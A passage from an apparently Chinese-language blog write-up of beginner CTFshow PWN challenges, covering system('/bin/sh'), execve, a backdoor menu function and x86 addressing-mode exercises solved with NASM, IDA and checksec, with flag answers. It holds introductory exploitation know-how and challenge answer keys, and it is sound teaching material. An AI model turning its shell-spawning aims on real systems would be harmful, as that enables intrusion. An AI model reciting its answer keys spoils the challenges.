<p>system()函数先fork一个子进程，在这个子进程中调用/bin/sh -c来执行command指定的命令。/bin/sh在系统中一般是个软链接，指向dash或者bash等常用的shell，-c选项是告诉shell从字符串command中读取要执行的命令（shell将扩展command中的任何特殊字符）。父进程则调用waitpid()函数来为变成僵尸的子进程收尸，获得其结束状态，然后将这个结束状态返回给system()函数的调用者。</p>
<blockquote class="alert alert-note">
    <blockquote>
<p><code>system(&quot;/bin/sh&quot;)</code> 的工作原理可简化为：
<strong>通过 <code>system</code> 函数创建子进程 → 子进程执行 <code>/bin/sh</code> 程序 → 启动交互式 shell 环境</strong>。</p>
<p>这也是漏洞利用中最常用的<strong>获取权限</strong>的方式 —— 无论通过栈溢出、ROP 还是 ret2libc，最终目标都是让程序执行这条语句（或等效的系统调用）。</p></blockquote></blockquote>
<h3 id="pwn_003">PWN_003
</h3><p>题目： <a class="link" href="PWN_003" >PWN_003</a> 哪一个函数才能读取flag？</p>
<p><img src="/p/ctfshow-pwn-writeup/9.png"
	width="835"
	height="485"
	srcset="/p/ctfshow-pwn-writeup/9_hu_cf2d18ee43fc45c9.png 480w, /p/ctfshow-pwn-writeup/9_hu_4af22d79b2909177.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="172"
		data-flex-basis="413px"
	
></p>
<p>通过前面的分析，我们可以很明显的看出来选项”6”为我们所需要的后门函数，其他的均不会得到我们所想要的flag，在system函数里面的命令都是在终端执行的，赋予system权限较大，在我所写的文章里，包括PWN入门知识讲解和操作系统都明确指出SYSTEM是与操作系统内核接触的，比Administrators的权限还要稍大。</p>
<p>直接选6秒了，但除这种送分的，其实还需要搞清运行的逻辑：</p>
<p><img src="/p/ctfshow-pwn-writeup/10.png"
	width="1390"
	height="554"
	srcset="/p/ctfshow-pwn-writeup/10_hu_c9707c3fe7bf59e8.png 480w, /p/ctfshow-pwn-writeup/10_hu_b592fb61e24a27ee.png 1024w"
	loading="lazy"
	
		alt="IDAx64位程序反编译"
	
	
		class="gallery-image" 
		data-flex-grow="250"
		data-flex-basis="602px"
	
></p>
<p>跟进一下menu函数里边：</p>
<p><img src="/p/ctfshow-pwn-writeup/11.png"
	width="726"
	height="280"
	srcset="/p/ctfshow-pwn-writeup/11_hu_3d734164c38877e4.png 480w, /p/ctfshow-pwn-writeup/11_hu_685776f269a503fb.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="259"
		data-flex-basis="622px"
	
></p>
<p>回到main跟进一下这个“6”的函数，看看里头是不是真在执行system后门函数：</p>
<p><img src="/p/ctfshow-pwn-writeup/12.png"
	width="744"
	height="240"
	srcset="/p/ctfshow-pwn-writeup/12_hu_9db861ef6fbcf71d.png 480w, /p/ctfshow-pwn-writeup/12_hu_9d996ee2d6fc5f89.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="310"
		data-flex-basis="744px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/13.png"
	width="501"
	height="119"
	srcset="/p/ctfshow-pwn-writeup/13_hu_b70d12fb710b2ef9.png 480w, /p/ctfshow-pwn-writeup/13_hu_c960f6a7ed96e8b6.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="421"
		data-flex-basis="1010px"
	
></p>
<p>可以看到，确实是执行了。那么我们也就能得到我们需要的flag。</p>
<h3 id="pwn_004">PWN_004
</h3><p>题目： <a class="link" href="PWN_004" >PWN_004</a> 或许需要先得到某个神秘字符</p>
<p>真够阴间的，啥也不给了，才第几道啊就上强度了。</p>
<p><img src="/p/ctfshow-pwn-writeup/14.png"
	width="1060"
	height="574"
	srcset="/p/ctfshow-pwn-writeup/14_hu_fb649637a5b6a11b.png 480w, /p/ctfshow-pwn-writeup/14_hu_c8ef954931f877ea.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="184"
		data-flex-basis="443px"
	
></p>
<p>checksec看看，然后IDA反编译看看：</p>
<p><img src="/p/ctfshow-pwn-writeup/15.png"
	width="481"
	height="159"
	srcset="/p/ctfshow-pwn-writeup/15_hu_5f0f4805cec82d66.png 480w, /p/ctfshow-pwn-writeup/15_hu_e21b6ee28222ffbe.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="302"
		data-flex-basis="726px"
	
></p>
<p>64位二进制保护全开&hellip;</p>
<p><img src="/p/ctfshow-pwn-writeup/16.png"
	width="753"
	height="341"
	srcset="/p/ctfshow-pwn-writeup/16_hu_ca7b56f27f75a918.png 480w, /p/ctfshow-pwn-writeup/16_hu_6ad185fb146bb9a2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="220"
		data-flex-basis="529px"
	
></p>
<p>可以看到有几个似曾相识的函数：strcpy（复制函数把xx复制给s1，也可起到赋值的作用）、strcmp（比较函数，对比，判断作用）、execve（）；我曾说过汇编语言的cmp就有比较作用，这也算是类比吧，回想起来的，不过用AI搜一下也行。</p>
<p>来说下execve吧，上题讲过system函数，这个也应该知道的：</p>
<p><code>execve</code> 是 Unix/Linux 系统中最核心的<strong>系统调用（system call）</strong> 之一，用于<strong>在当前进程中加载并执行一个新的程序</strong>，替换当前进程的代码、数据和堆栈，实现进程 “变身”。它是所有程序启动和替换的底层基础，包括 <code>system</code> 函数、shell 执行命令等最终都会依赖 <code>execve</code> 完成。</p>
<p>看到这段代码，大致意思是，让s1等于“CTFshowPWN”这段字符串，然后到if判断语句这进行比较：<strong>如果s1和s2相等</strong>（这里的！不是我们C语言中的“不”的意思啊），就执行execve函数，启动交互权限，从而得到flag。</p>
<p><img src="/p/ctfshow-pwn-writeup/17.png"
	width="890"
	height="506"
	srcset="/p/ctfshow-pwn-writeup/17_hu_cb606be9be72c140.png 480w, /p/ctfshow-pwn-writeup/17_hu_e8a05d11d9a5f65f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="175"
		data-flex-basis="422px"
	
></p>
<p>至此：下一节就开始前置基础了，开始应用<a class="link" href="https://expl0rer.top/p/pwn-1/"  target="_blank" rel="noopener"
    >PWN-1</a>、<a class="link" href="https://expl0rer.top/p/pwn-2/"  target="_blank" rel="noopener"
    >PWN-2</a>、<a class="link" href="https://expl0rer.top/p/pwn-3/"  target="_blank" rel="noopener"
    >PWN-3</a>所学的知识了。</p>
<h2 id="前置基础">前置基础
</h2><h3 id="pwn_005">PWN_005
</h3><p>题目：运行此文件，将得到的字符串以ctfshow{xxxxx}提交。</p>
<p>如：运行文件后 输出的内容为 Hello_World</p>
<p>提交的flag值为：ctfshow{Hello_World}</p>
<p><strong>注：计组原理题型后续的flag中地址字母大写</strong></p>
<p><a class="link" href="PWN_005%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_005%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<p>Welcome_to_CTFshow.asm文本打开后发现是汇编语言文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="k">section</span> <span class="nv">.data</span>
</span></span><span class="line"><span class="cl">    <span class="nf">msg</span> <span class="nv">db</span> <span class="s">&#34;Welcome_to_CTFshow_PWN&#34;</span><span class="p">,</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">section</span> <span class="nv">.text</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">_start</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">_start:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; 立即寻址方式</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">11</span>         <span class="c1">; 将11赋值给eax</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">114504</span>     <span class="c1">; eax加上114504</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; eax减去1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; 寄存器寻址方式</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x36d</span>      <span class="c1">; 将0x36d赋值给ebx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>        <span class="c1">; 将ebx的值赋值给edx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; 直接寻址方式</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>      <span class="c1">; 将msg的地址赋值给ecx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; 寄存器间接寻址方式</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; 将msg的地址赋值给esi</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>      <span class="c1">; 将esi所指向的地址的值赋值给eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; 寄存器相对寻址方式</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; 将msg的地址赋值给ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">4</span>          <span class="c1">; 将ecx加上4</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>      <span class="c1">; 将ecx所指向的地址的值赋值给eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; 基址变址寻址方式</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; 将msg的地址赋值给ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">2</span>          <span class="c1">; 将2赋值给edx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>  <span class="c1">; 将ecx+edx*2所指向的地址的值赋值给eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; 相对基址变址寻址方式</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; 将msg的地址赋值给ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; 将1赋值给edx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">8</span>          <span class="c1">; 将ecx加上8</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span> <span class="o">+</span> <span class="nb">edx</span><span class="o">*</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">6</span><span class="p">]</span>  <span class="c1">; 将ecx+edx*2-6所指向的地址的值赋值给eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; 输出字符串</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">4</span>          <span class="c1">; 系统调用号4代表输出字符串</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; 文件描述符1代表标准输出</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; 要输出的字符串的地址</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">22</span>         <span class="c1">; 要输出的字符串的长度</span>
</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; 调用系统调用</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">; 退出程序</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>          <span class="c1">; 系统调用号1代表退出程序</span>
</span></span><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>        <span class="c1">; 返回值为0</span>
</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="mh">0x80</span>            <span class="c1">; 调用系统调用</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>checksec一下这个PWN文件：</p>
<p><img src="/p/ctfshow-pwn-writeup/18.png"
	width="560"
	height="160"
	srcset="/p/ctfshow-pwn-writeup/18_hu_b88e80be1380d264.png 480w, /p/ctfshow-pwn-writeup/18_hu_edb93148c7d1aae7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="350"
		data-flex-basis="840px"
	
></p>
<p>ohoh这个保护全关的！IDA的x32位</p>
<p><img src="/p/ctfshow-pwn-writeup/19.png"
	width="986"
	height="270"
	srcset="/p/ctfshow-pwn-writeup/19_hu_5a1e69eadca2a8dd.png 480w, /p/ctfshow-pwn-writeup/19_hu_94c08c2f6f98fd2d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="365"
		data-flex-basis="876px"
	
></p>
<p>这个没main函数，那我们回看那段汇编语言asm，这段汇编语言更像是在帮助我们了解汇编语言的逻辑语法规则的，在<a class="link" href="https://expl0rer.top/p/pwn-1/"  target="_blank" rel="noopener"
    >PWN-1</a>文章中就有讲过汇编语言，这里就直接跳过详解</p>
<p>这题开始就有点变样了，“Welcome_to_CTFshow.asm”这文件是一个存放汇编语言的文本文件，需要运行一下转换成像exe这样的可执行文件，在PWN-1讲过elf文件：</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>将汇编语言（.asm）文件转换为可执行文件，需要经过<strong>汇编（Assemble）</strong> 和<strong>链接（Link）</strong> 两个核心步骤.</p></blockquote></blockquote>
<p>在Kali/Linux上下载nasm编辑器：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install nasm
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后下载ld链接器（通常自带）：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt install binutils
</span></span></code></pre></td></tr></table>
</div>
</div><p>汇编转换：将 .asm 转换为目标文件（.obj 或 .o）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nasm -f elf Welcome_to_CTFshow.asm
</span></span></code></pre></td></tr></table>
</div>
</div><p>汇编生成可执行文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ld -m elf_i386 -s -o Welcome_to_CTFshow1 Welcome_to_CTFshow.o
</span></span></code></pre></td></tr></table>
</div>
</div><p>（Welcome_to_CTFshow1是可执行文件）</p>
<p>我的建议汇编转换和生成可执行文件的过程都在Kali/Linux/Ubuntu上，比较方便，windows下载比较麻烦。</p>
<p>生成这个可执行文件之后，直接运行就能得到输出结果了，按照题目要求，加个{}包皮去提交就好了。</p>
<p><img src="/p/ctfshow-pwn-writeup/20.png"
	width="765"
	height="230"
	srcset="/p/ctfshow-pwn-writeup/20_hu_9d3cd65ccf046d84.png 480w, /p/ctfshow-pwn-writeup/20_hu_f0e09656aebee87e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="332"
		data-flex-basis="798px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/21.png"
	width="1040"
	height="295"
	srcset="/p/ctfshow-pwn-writeup/21_hu_96a8674a27a83293.png 480w, /p/ctfshow-pwn-writeup/21_hu_adca9e8247769340.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="352"
		data-flex-basis="846px"
	
></p>
<h3 id="pwn_006">PWN_006
</h3><p>题目：立即寻址方式结束后eax寄存器的值为？</p>
<p><a class="link" href="PWN_006%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_006%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<p>按照PWN-005那样去转换生成这个可执行文件</p>
<blockquote>
<p>汇编转换：将 .asm 转换为目标文件（.obj 或 .o）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nasm -f elf Welcome_to_CTFshow.asm
</span></span></code></pre></td></tr></table>
</div>
</div><p>汇编生成可执行文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ld -m elf_i386 -s -o Welcome_to_CTFshow1 Welcome_to_CTFshow.o
</span></span></code></pre></td></tr></table>
</div>
</div><p>（Welcome_to_CTFshow1是可执行文件）</p></blockquote>
<p><img src="/p/ctfshow-pwn-writeup/22.png"
	width="618"
	height="155"
	srcset="/p/ctfshow-pwn-writeup/22_hu_38c3a83cb1d6b3d2.png 480w, /p/ctfshow-pwn-writeup/22_hu_15cc2bc9e2e15087.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="398"
		data-flex-basis="956px"
	
></p>
<p>Welcome_to_CTFshow_PWN???是flag，错了，题目是<strong>立即寻址</strong>方式结束后<strong>eax寄存器的值</strong>为？</p>
<p>那就是得把这个转换出的可执行文件放到IDA上，不过之前记得checksec一下看看是x32还是x64位哦&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; 立即寻址方式</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">11</span>        <span class="c1">; 将11赋值给eax</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">114504</span>    <span class="c1">; eax加上114504</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">1</span>         <span class="c1">; eax减去1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/23.png"
	width="1153"
	height="151"
	srcset="/p/ctfshow-pwn-writeup/23_hu_d9da713c30313d8.png 480w, /p/ctfshow-pwn-writeup/23_hu_9162e9b7e00f4ccc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="763"
		data-flex-basis="1832px"
	
></p>
<p>那就加减法咯：11+114504-1=114514</p>
<p>ctfshow{114514}</p>
<h3 id="pwn_007">PWN_007
</h3><p>题目：<strong>寄存器寻址方式</strong>结束后<code>edx寄存器</code>的值为？</p>
<p><a class="link" href="PWN_007%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_007%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<p>按照上述方法去得出可执行文件，放入IDA：</p>
<p><img src="/p/ctfshow-pwn-writeup/24.png"
	width="985"
	height="95"
	srcset="/p/ctfshow-pwn-writeup/24_hu_92bd39fab506337a.png 480w, /p/ctfshow-pwn-writeup/24_hu_75d2f4fa5f54ead5.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1036"
		data-flex-basis="2488px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; 寄存器寻址方式</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0x36d</span> <span class="c1">; 将0x36d赋值给ebx</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span> <span class="c1">; 将ebx的值赋值给edx</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>所以ctfshow{0x36D}</p>
<h3 id="pwn_008">PWN_008
</h3><p>题目：直接寻址方式结束后ecx寄存器的值为？</p>
<p><a class="link" href="..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_008%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_008%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; 直接寻址方式</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nv">msg</span><span class="p">]</span> <span class="c1">; 将msg的地址赋值给ecx</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>当你编译后发现找不到地址[msg]，然后我们倒回来找题目的Welcome_to_CTFshow文件，用IDA：</p>
<p><img src="/p/ctfshow-pwn-writeup/25.png"
	width="721"
	height="25"
	srcset="/p/ctfshow-pwn-writeup/25_hu_5372def4240b6f53.png 480w, /p/ctfshow-pwn-writeup/25_hu_1d2087bdde9824cc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="2884"
		data-flex-basis="6921px"
	
></p>
<p>故flag:ctfshow{0x80490E8}</p>
<p>其实不用去进行编译的，在题目给的文件就能做，编译出来的其实就是题目给的文件。</p>
<h3 id="pwn_009">PWN_009
</h3><p>题目：<strong>寄存器间接寻址</strong>方式结束后eax寄存器的值为？</p>
<p><a class="link" href="..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_009%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="..%5c..%5c..%5c..%5c..%5cLegion22%5cCTF-CTFshow%e7%a7%81%e6%95%99-PWN%5c02_%e5%89%8d%e7%bd%ae%e5%9f%ba%e7%a1%80%5cpwn_009%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; 寄存器间接寻址方式</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; 将msg的地址赋值给esi</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>      <span class="c1">; 将esi所指向的地址的值赋值给eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/26.png"
	width="650"
	height="175"
	srcset="/p/ctfshow-pwn-writeup/26_hu_db95f2c70775bfb6.png 480w, /p/ctfshow-pwn-writeup/26_hu_6e7577b16306137d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="371"
		data-flex-basis="891px"
	
></p>
<p>不是80490E8哈别被误导了，这是<strong>虚拟地址</strong>哦</p>
<p>点击跟进：</p>
<p><img src="/p/ctfshow-pwn-writeup/27.png"
	width="659"
	height="25"
	srcset="/p/ctfshow-pwn-writeup/27_hu_2f879014412c83d2.png 480w, /p/ctfshow-pwn-writeup/27_hu_a9abfa63d7183e7a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="2636"
		data-flex-basis="6326px"
	
></p>
<p><strong><code>dd 636C6557h</code></strong>：<code>dd</code> 是汇编指令中的伪操作符，意为 “定义双字（define double word）”，表示在当前地址处存放一个 4 字节的数值。这里存放的数值是 <code>636C6557h</code>（十六进制）。</p>
<p>flag:ctfshow{0x636C6557}</p>
<h3 id="pwn_010">PWN_010
</h3><p>题目：<strong>寄存器相对寻址</strong>方式结束后eax寄存器的值为？</p>
<p><a class="link" href="PWN_010%5cWelcome_to_CTFshow" >Welcome_to_CTFshow</a></p>
<p><a class="link" href="PWN_010%5cWelcome_to_CTFshow.asm" >Welcome_to_CTFshow.asm</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; 寄存器相对寻址方式</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nv">msg</span>        <span class="c1">; 将msg的地址赋值给ecx</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">4</span>          <span class="c1">; 将ecx加上4</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>      <span class="c1">; 将ecx所指向的地址的值赋值给eax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/28.png"
	width="845"
	height="154"
